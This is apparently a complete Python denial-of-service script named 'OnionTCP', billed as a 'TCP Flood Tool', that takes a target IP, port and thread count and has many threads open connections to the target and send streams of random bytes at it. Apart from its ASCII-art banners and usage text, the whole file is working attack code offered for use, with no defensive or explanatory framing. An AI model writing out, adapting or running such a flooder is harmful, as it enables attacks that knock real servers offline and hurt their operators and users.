#==================[Coded By OnionTM]===================
from threading import Thread
from time import sleep
import socket, sys, random
def SlowPrint(txt):
    for x in txt:
        print(x, end='', flush=True)
        sleep(0.001)
    print()
#===================[SYS]===================
if len(sys.argv) < 3:
    SlowPrint("""

  /$$$$$$            /$$                  /$$$$$$$$ /$$$$$$  /$$$$$$$
 /$$__  $$          |__/                 |__  $$__//$$__  $$| $$__  $$
| $$  \ $$ /$$$$$$$  /$$  /$$$$$$  /$$$$$$$ | $$  | $$  \__/| $$  \ $$
| $$  | $$| $$__  $$| $$ /$$__  $$| $$__  $$| $$  | $$      | $$$$$$$/
| $$  | $$| $$  \ $$| $$| $$  \ $$| $$  \ $$| $$  | $$      | $$____/
| $$  | $$| $$  | $$| $$| $$  | $$| $$  | $$| $$  | $$    $$| $$
|  $$$$$$/| $$  | $$| $$|  $$$$$$/| $$  | $$| $$  |  $$$$$$/| $$
 \______/ |__/  |__/|__/ \______/ |__/  |__/|__/   \______/ |__|

[!] TCP Flood Tool v1.0
[!] Coded By OnionTM

[!] Usage : python OnionTCP.py <ip> <port> <thread>
""")
    exit()
else:
    ip = sys.argv[1]
    port = int(sys.argv[2])
    thread = int(sys.argv[3])
#===================[ATTACK]===================
def tcp():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tar = (str(ip),int(port))
            bytes = random._urandom(1024)
            s.connect(tar)
            for _ in range(600):
                s.send(bytes)
                print(f'Attacking to {str(ip)}:{str(port)} with {str(thread)} threads')
        except KeyboardInterrupt:
            exit()
        except:
            s.close()
#===================[BANNER]===================
SlowPrint("""

  /$$$$$$            /$$                  /$$$$$$$$ /$$$$$$  /$$$$$$$
 /$$__  $$          |__/                 |__  $$__//$$__  $$| $$__  $$
| $$  \ $$ /$$$$$$$  /$$  /$$$$$$  /$$$$$$$ | $$  | $$  \__/| $$  \ $$
| $$  | $$| $$__  $$| $$ /$$__  $$| $$__  $$| $$  | $$      | $$$$$$$/
| $$  | $$| $$  \ $$| $$| $$  \ $$| $$  \ $$| $$  | $$      | $$____/
| $$  | $$| $$  | $$| $$| $$  | $$| $$  | $$| $$  | $$    $$| $$
|  $$$$$$/| $$  | $$| $$|  $$$$$$/| $$  | $$| $$  |  $$$$$$/| $$
 \______/ |__/  |__/|__/ \______/ |__/  |__/|__/   \______/ |__|

[!] TCP Flood Tool v1.0
[!] Coded By OnionTM
""")
print(f"Attack Started To {str(ip)} On Port {str(port)}")
#===================[THREAD]===================
for _ in range(thread - 1):
    Thread(target=tcp).start()
#==================[########]===================
#           https://Github.com/OnionTM
#==================[########]===================
